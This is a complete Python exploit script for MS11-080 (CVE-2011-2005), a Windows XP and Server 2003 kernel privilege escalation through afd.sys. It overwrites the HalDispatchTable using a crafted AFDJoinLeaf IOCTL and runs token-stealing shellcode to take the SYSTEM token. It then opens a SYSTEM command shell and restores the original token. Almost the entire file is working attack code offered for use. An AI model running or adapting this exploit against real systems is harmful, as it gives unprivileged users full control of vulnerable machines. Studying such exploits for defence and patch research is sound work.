################################################################################
######### MS11-080 - CVE-2011-2005 Afd.sys Privilege Escalation Exploit ########
#########         Author: ryujin@offsec.com - Matteo Memelli            ########
#########                      Spaghetti & Pwnsauce                     ########
#########              yuck! 0xbaadf00d Elwood@mac&cheese.com           ########
#########                                                               ########
#########      Thx to dookie(lifesaver)2000ca, dijital1 and ronin       ########
#########                        for helping out!                       ########
#########                                                               ########
#########                   To my Master Shifu muts:                    ########
#########           "So that's it, I just need inner peace?" ;)         ########
#########                                                               ########
#########        Exploit tested on the following 32bits systems:        ########
#########       Win XPSP3 Eng, Win 2K3SP2 Standard/Enterprise Eng       ########
################################################################################

from ctypes import (windll, CDLL, Structure, byref, sizeof, POINTER,
                    c_char, c_short, c_ushort, c_int, c_uint, c_ulong,
                    c_void_p, c_long, c_char_p)
from ctypes.wintypes import HANDLE, DWORD
import socket, time, os, struct, sys
from optparse import OptionParser

usage =  "%prog -O TARGET_OS"
parser = OptionParser(usage=usage)
parser.add_option("-O", "--target-os", type="string",
                  action="store", dest="target_os",
                  help="Target OS. Accepted values: XP, 2K3")
(options, args) = parser.parse_args()
OS = options.target_os
if not OS or OS.upper() not in ['XP','2K3']:
   parser.print_help()
   sys.exit()
OS = OS.upper()

kernel32 = windll.kernel32
ntdll    = windll.ntdll
Psapi    = windll.Psapi

def findSysBase(drvname=None): 
    ARRAY_SIZE            = 1024 
    myarray               = c_ulong * ARRAY_SIZE  
    lpImageBase           = myarray()  
    cb                    = c_int(1024)  
    lpcbNeeded            = c_long()  
    drivername_size       = c_long()  
    drivername_size.value = 48 
    Psapi.EnumDeviceDrivers(byref(lpImageBase), cb, byref(lpcbNeeded))  
    for baseaddy in lpImageBase:  
        drivername = c_char_p("\x00"*drivername_size.value)  
        if baseaddy:  
            Psapi.GetDeviceDriverBaseNameA(baseaddy, drivername,  
                            drivername_size.value)
            if drvname:
                if drivername.value.lower() == drvname:
                    print "[+] Retrieving %s info..." % drvname
                    print "[+] %s base address: %s" % (drvname, hex(baseaddy))
                    return baseaddy
            else:
                if drivername.value.lower().find("krnl") !=-1:
                    print "[+] Retrieving Kernel info..."
                    print "[+] Kernel version:", drivername.value
                    print "[+] Kernel base address: %s" % hex(baseaddy)  
                    return (baseaddy, drivername.value)
    return None

print "[>] MS11-080 Privilege Escalation Exploit"
print "[>] Matteo Memelli - ryujin@offsec.com"
print "[>] Release Date 28/11/2011"

WSAGetLastError          = windll.Ws2_32.WSAGetLastError
WSAGetLastError.argtypes = ()
WSAGetLastError.restype  = c_int
SOCKET                   = c_int
WSASocket                = windll.Ws2_32.WSASocketA
WSASocket.argtypes       = (c_int, c_int, c_int, c_void_p, c_uint, DWORD)
WSASocket.restype        = SOCKET
closesocket              = windll.Ws2_32.closesocket
closesocket.argtypes     = (SOCKET,)
closesocket.restype      = c_int
connect                  = windll.Ws2_32.connect
connect.argtypes         = (SOCKET, c_void_p, c_int)
connect.restype          = c_int

class sockaddr_in(Structure):
    _fields_ = [
        ("sin_family", c_short),
        ("sin_port", c_ushort),
        ("sin_addr", c_ulong),
        ("sin_zero", c_char * 8),
        ]

## Create our deviceiocontrol socket handle
client = WSASocket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP,
                   None, 0, 0)
if client == ~0:
    raise OSError, "WSASocket: %s" % (WSAGetLastError(),)
try:
    addr = sockaddr_in()
    addr.sin_family = socket.AF_INET
    addr.sin_port = socket.htons(4455)
    addr.sin_addr = socket.htonl(0x7f000001) # 127.0.0.1
    ## We need to connect to a closed port, socket state must be CONNECTING
    connect(client, byref(addr), sizeof(addr))
except:
    closesocket(client)
    raise

baseadd    = c_int(0x1001)
MEMRES     = (0x1000 | 0x2000)
PAGEEXE    = 0x00000040
Zerobits   = c_int(0)
RegionSize = c_int(0x1000)
written    = c_int(0)
## This will trigger the path to AfdRestartJoin
irpstuff   = ("\x41\x41\x41\x41\x42\x42\x42\x42"
              "\x00\x00\x00\x00\x44\x44\x44\x44"
              "\x01\x00\x00\x00"
              "\xe8\x00" + "4" + "\xf0\x00" + "\x45"*231)
## Allocate space for the input buffer
dwStatus = ntdll.NtAllocateVirtualMemory(-1,
                                     byref(baseadd),
                                     0x0,
                                     byref(RegionSize),
                                     MEMRES,
                                     PAGEEXE)
# Copy input buffer to it
kernel32.WriteProcessMemory(-1, 0x1000, irpstuff, 0x100, byref(written))
startPage = c_int(0x00020000)
kernel32.VirtualProtect(startPage, 0x1000, PAGEEXE, byref(written))
################################# KERNEL INFO ##################################
lpDriver     = c_char_p()
lpPath       = c_char_p()
lpDrvAddress = c_long()
(krnlbase, kernelver) = findSysBase()
hKernel = kernel32.LoadLibraryExA(kernelver, 0, 1)
HalDispatchTable = kernel32.GetProcAddress(hKernel, "HalDispatchTable")
HalDispatchTable -= hKernel
HalDispatchTable += krnlbase
print "[+] HalDispatchTable address:", hex(HalDispatchTable)
halbase = findSysBase("hal.dll")
## WinXP SP3
if OS == "XP":
    HaliQuerySystemInformation = halbase+0x16bba # Offset for XPSP3
    HalpSetSystemInformation   = halbase+0x19436 # Offset for XPSP3
## Win2k3 SP2
else:
    HaliQuerySystemInformation = halbase+0x1fa1e # Offset for WIN2K3
    HalpSetSystemInformation   = halbase+0x21c60 # Offset for WIN2K3
print "[+] HaliQuerySystemInformation address:", hex(HaliQuerySystemInformation)
print "[+] HalpSetSystemInformation address:", hex(HalpSetSystemInformation)

################################# EXPLOITATION #################################
shellcode_address_dep   = 0x0002071e
shellcode_address_nodep = 0x000207b8
padding           = "\x90"*2
HalDispatchTable0x4 = HalDispatchTable + 0x4
HalDispatchTable0x8 = HalDispatchTable + 0x8
## tokenbkaddr      = 0x00020900
if OS == "XP":
    _KPROCESS = "\x44"
    _TOKEN    = "\xc8"
    _UPID     = "\x84"
    _APLINKS  = "\x88"
else:
    _KPROCESS = "\x38"
    _TOKEN    = "\xd8"
    _UPID     = "\x94"
    _APLINKS  = "\x98"
    
restore_ptrs =   "\x31\xc0" + \
                 "\xb8" + struct.pack("L", HalpSetSystemInformation) + \
                 "\xa3" + struct.pack("L", HalDispatchTable0x8) + \
                 "\xb8" + struct.pack("L", HaliQuerySystemInformation) + \
                 "\xa3" + struct.pack("L", HalDispatchTable0x4)
tokenstealing =  "\x52"                                 +\
                 "\x53"                                 +\
                 "\x33\xc0"                             +\
                 "\x64\x8b\x80\x24\x01\x00\x00"         +\
                 "\x8b\x40" + _KPROCESS                 +\
                 "\x8b\xc8"                             +\
                 "\x8b\x98" + _TOKEN + "\x00\x00\x00"   +\
                 "\x89\x1d\x00\x09\x02\x00"             +\
                 "\x8b\x80" + _APLINKS + "\x00\x00\x00" +\
                 "\x81\xe8" + _APLINKS + "\x00\x00\x00" +\
                 "\x81\xb8" + _UPID + "\x00\x00\x00\x04\x00\x00\x00" +\
                 "\x75\xe8"                             +\
                 "\x8b\x90" + _TOKEN + "\x00\x00\x00"   +\
                 "\x8b\xc1"                             +\
                 "\x89\x90" + _TOKEN + "\x00\x00\x00"   +\
                 "\x5b"                                 +\
                 "\x5a"                                 +\
                 "\xc2\x10"
restore_token =  "\x52"                                 +\
                 "\x33\xc0"                             +\
                 "\x64\x8b\x80\x24\x01\x00\x00"         +\
                 "\x8b\x40" + _KPROCESS                 +\
                 "\x8b\x15\x00\x09\x02\x00"             +\
                 "\x89\x90" + _TOKEN + "\x00\x00\x00"   +\
                 "\x5a"                                 +\
                 "\xc2\x10"
                 
shellcode         = padding + restore_ptrs + tokenstealing
shellcode_size    = len(shellcode)
orig_size         = shellcode_size
# Write shellcode in userspace (dep)
kernel32.WriteProcessMemory(-1, shellcode_address_dep, shellcode,
                                   shellcode_size, byref(written))
# Write shellcode in userspace *(nodep)
kernel32.WriteProcessMemory(-1, shellcode_address_nodep, shellcode,
                                   shellcode_size, byref(written))
## Trigger Pointer Overwrite 
print "[*] Triggering AFDJoinLeaf pointer overwrite..."
IOCTL             = 0x000120bb                # AFDJoinLeaf
inputbuffer       = 0x1004
inputbuffer_size  = 0x108
outputbuffer_size = 0x0                       # Bypass Probe for Write
outputbuffer      = HalDispatchTable0x4 + 0x1 # HalDispatchTable+0x4+1
IoStatusBlock = c_ulong()
NTSTATUS = ntdll.ZwDeviceIoControlFile(client,
                                       None,
                                       None,
                                       None,
                                       byref(IoStatusBlock),
                                       IOCTL,
                                       inputbuffer,
                                       inputbuffer_size,
                                       outputbuffer,
                                       outputbuffer_size
                                       )
## Trigger shellcode
inp  = c_ulong()
out  = c_ulong() 
inp  = 0x1337
hola = ntdll.NtQueryIntervalProfile(inp, byref(out))
## Spawn a system shell, w00t!
print "[*] Spawning a SYSTEM shell..."
os.system("cmd.exe /T:C0 /K cd c:\\windows\\system32")

############################## POST EXPLOITATION ###############################
print "[*] Restoring token..."
## Restore the thingie
shellcode         = padding + restore_ptrs + restore_token
shellcode_size    = len(shellcode)
trail_padding     = (orig_size - shellcode_size) * "\x00"
shellcode        += trail_padding
shellcode_size   += (orig_size - shellcode_size)
## Write restore shellcode in userspace (dep)
kernel32.WriteProcessMemory(-1, shellcode_address_dep, shellcode,
                                   shellcode_size, byref(written))
## Write restore shellcode in userspace (nodep)
kernel32.WriteProcessMemory(-1, shellcode_address_nodep, shellcode,
                                   shellcode_size, byref(written))
## Overwrite HalDispatchTable once again
NTSTATUS = ntdll.ZwDeviceIoControlFile(client,
                                       None,
                                       None,
                                       None,
                                       byref(IoStatusBlock),
                                       IOCTL,
                                       inputbuffer,
                                       inputbuffer_size,
                                       outputbuffer,
                                       outputbuffer_size
                                       )
## Trigger restore shellcode
hola = ntdll.NtQueryIntervalProfile(inp, byref(out))
print "[+] Restore done! Have a nice day :)"
